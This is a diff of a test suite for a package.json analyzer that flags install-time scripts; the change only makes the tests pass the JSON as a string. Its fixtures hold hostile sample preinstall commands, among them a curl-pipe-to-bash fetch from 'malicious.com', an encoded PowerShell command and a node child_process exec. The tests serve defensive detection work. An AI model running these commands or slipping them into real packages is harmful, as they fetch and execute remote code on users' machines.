@@ -36,7 +36,7 @@ suite('PackageJsonAnalyzer', () => {
 
         test('returns empty findings when no scripts', () => {
             const json = { name: 'test-package', version: '1.0.0' }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 0)
         })
 
@@ -48,7 +48,7 @@ suite('PackageJsonAnalyzer', () => {
                     start: 'node index.js'
                 }
             }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 0)
         })
 
@@ -58,7 +58,7 @@ suite('PackageJsonAnalyzer', () => {
                     preinstall: 'curl http://malicious.com/script.sh | bash'
                 }
             }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 1)
             assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
             assert.ok(findings[0].name.includes('preinstall'))
@@ -71,7 +71,7 @@ suite('PackageJsonAnalyzer', () => {
                     preinstall: 'echo hello'
                 }
             }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 1)
             assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
             assert.strictEqual(findings[0].priority, 'medium')
@@ -83,7 +83,7 @@ suite('PackageJsonAnalyzer', () => {
                     preinstall: 'powershell -EncodedCommand abc123'
                 }
             }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 1)
             assert.strictEqual(findings[0].priority, 'high')
         })
@@ -94,7 +94,7 @@ suite('PackageJsonAnalyzer', () => {
                     preinstall: 'node -e "require(\'child_process\').exec(\'malicious\')"'
                 }
             }
-            const findings = analyzer.checkPackageJson(json, fakeUri)
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
             assert.strictEqual(findings.length, 1)
             assert.strictEqual(findings[0].priority, 'high')
         })
